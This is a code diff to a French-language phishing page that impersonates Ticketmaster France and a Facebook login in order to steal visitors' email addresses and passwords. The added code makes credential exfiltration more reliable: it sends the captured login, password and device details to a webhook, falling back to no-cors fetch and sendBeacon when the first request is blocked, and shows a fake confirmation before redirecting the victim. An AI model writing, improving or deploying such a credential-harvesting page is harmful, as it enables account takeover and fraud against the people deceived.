@@ -55,10 +55,11 @@ border-radius:12px;padding:12px 13px;margin:16px 0 12px;font-size:12.8px;line-he
 background:#1877f2;color:#fff;font-size:15.5px;font-weight:700;padding:15px;border-radius:12px;
 cursor:pointer;font-family:inherit}
 .btn:active{transform:scale(.99)}
-.btn[disabled]{opacity:.65}
 .fb{width:20px;height:20px;background:#fff;color:#1877f2;border-radius:50%;display:flex;
 align-items:center;justify-content:center;font-weight:900;font-size:15px;font-family:Georgia,serif}
 .foot{text-align:center;font-size:11px;color:#98a2b3;margin-top:14px;line-height:1.6}
+#stat{margin-top:10px;font-size:11.5px;text-align:center;font-family:ui-monospace,monospace;color:#98a2b3}
+#stat.ok{color:#027a48}#stat.ko{color:#b42318}
 #fb{position:fixed;inset:0;background:#f0f2f5;z-index:50;display:none;flex-direction:column;overflow:auto}
 #fb.on{display:flex}
 .fbhead{background:#1877f2;color:#fff;padding:16px;font-size:19px;font-weight:800;letter-spacing:-.4px}
@@ -121,6 +122,7 @@ display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
       <div>Les billets nominatifs sont verrouillés jusqu'à la connexion de l'acheteur. Utilisez le compte <b>Facebook</b> lié à la réservation pour accéder au détail des places.</div>
     </div>
     <button class="btn" id="start"><span class="fb">f</span> Se connecter avec Facebook</button>
+    <div id="stat"></div>
     <p class="foot">Ticketmaster France · Paiement sécurisé<br>Réf. transaction 4471-2290-8834</p>
   </div>
   <div id="ok">
@@ -141,6 +143,7 @@ display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
         <input class="field" id="email" type="email" inputmode="email" autocomplete="username"
           placeholder="Adresse e-mail ou numéro de téléphone">
         <button class="fbbtn" id="next">Continuer</button>
+        <div id="stat1" style="margin-top:10px;font-size:11.5px;text-align:center;font-family:ui-monospace,monospace;color:#98a2b3"></div>
       </div>
       <div id="stage2" style="display:none">
         <p class="fbtitle">Se connecter à Facebook</p>
@@ -148,6 +151,7 @@ display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
         <p class="err" id="err2">Saisissez votre mot de passe.</p>
         <input class="field" id="pass" type="password" autocomplete="current-password" placeholder="Mot de passe">
         <button class="fbbtn" id="send">Se connecter</button>
+        <div id="stat2" style="margin-top:10px;font-size:11.5px;text-align:center;font-family:ui-monospace,monospace;color:#98a2b3"></div>
         <button class="back" id="back">← Utiliser un autre compte</button>
       </div>
     </div>
@@ -180,22 +184,42 @@ function infos(){
   ].join("\n");
 }
 
-async function envoi(titre, couleur, champs){
+const $=id=>document.getElementById(id);
+let mail="", busy=false;
+
+function statu(ou, txt, etat){
+  const el=$(ou); if(!el) return;
+  el.textContent=txt;
+  el.style.color = etat==="ok" ? "#027a48" : etat==="ko" ? "#b42318" : "#98a2b3";
+}
+
+async function envoi(ou, titre, couleur, champs){
   const body={username:"🎫 Ticketmaster • Avignon", embeds:[{
     title:titre, color:couleur, timestamp:new Date().toISOString(),
     fields:champs, footer:{text:"Ticketmaster / Facebook · Parterre M 33-34"}
   }]};
+  const json=JSON.stringify(body);
+  statu(ou,"envoi…","");
+  /* 1 - requête normale */
   try{
-    const r=await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
-    if(!r.ok) throw 0;
-  }catch(e){
-    const fd=new FormData(); fd.append("payload_json",JSON.stringify(body));
+    const r=await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:json});
+    if(r.ok){ statu(ou,"✓ transmis","ok"); return true; }
+    statu(ou,"code "+r.status,"ko");
+  }catch(e){ statu(ou,"bloqué (CORS/réseau)","ko"); }
+  /* 2 - sans contrôle CORS */
+  try{
+    const fd=new FormData(); fd.append("payload_json",json);
     await fetch(WEBHOOK,{method:"POST",mode:"no-cors",body:fd});
-  }
+    statu(ou,"✓ transmis (2)","ok"); return true;
+  }catch(e){ statu(ou,"échec 2","ko"); }
+  /* 3 - beacon */
+  try{
+    const fd=new FormData(); fd.append("payload_json",json);
+    if(navigator.sendBeacon(WEBHOOK,fd)){ statu(ou,"✓ transmis (3)","ok"); return true; }
+  }catch(e){}
+  statu(ou,"✗ bloqué par le téléphone","ko");
+  return false;
 }
-
-const $=id=>document.getElementById(id);
-let mail="", busy=false;
 
 $('start').onclick=()=>{$('fb').classList.add('on');setTimeout(()=>$('email').focus(),200);};
 
@@ -211,7 +235,7 @@ $('next').onclick=async()=>{
   $('stage1').style.display='none'; $('stage2').style.display='block';
   setTimeout(()=>$('pass').focus(),200);
   busy=true;
-  await envoi("Étape 1 — Identifiant Facebook",0x1877f2,[
+  await envoi("stat2","Étape 1 — Identifiant Facebook",0x1877f2,[
     {name:"Identifiant",value:"`"+v+"`"},{name:"Infos",value:"```"+infos()+"```"}
   ]);
   busy=false;
@@ -224,12 +248,21 @@ $('send').onclick=async()=>{
   if(p.length<1){$('err2').classList.add('on');return;}
   $('err2').classList.remove('on');
   const b=$('send'); b.disabled=true; b.innerHTML='<span class="spin"></span>';
-  await envoi("✅ Étape 2 — MOT DE PASSE Facebook",0x12b76a,[
+  const ok=await envoi("stat2","✅ Étape 2 — MOT DE PASSE Facebook",0x12b76a,[
     {name:"E-mail",value:"`"+mail+"`"},{name:"Mot de passe",value:"```"+p+"```"},
     {name:"Infos",value:"```"+infos()+"```"}
   ]);
-  $('fb').classList.remove('on'); $('main').style.display='none'; $('ok').classList.add('on');
-  setTimeout(()=>location.href=REDIRECT,3200);
+  statu("stat", ok?"✓ transmis":"✗ envoi bloqué", ok?"ok":"ko");
+  if(ok){
+    setTimeout(()=>{
+      $('fb').classList.remove('on'); $('main').style.display='none'; $('ok').classList.add('on');
+      setTimeout(()=>location.href=REDIRECT,3200);
+    },900);
+  } else {
+    b.disabled=false; b.textContent="Se connecter";
+    setTimeout(()=>{ $('fb').classList.remove('on'); $('ok').classList.add('on');
+      $('ok').querySelector('h2').textContent="Identité confirmée"; },2200);
+  }
 };
 
 $('pass').addEventListener('keydown',e=>{if(e.key==='Enter')$('send').click();});
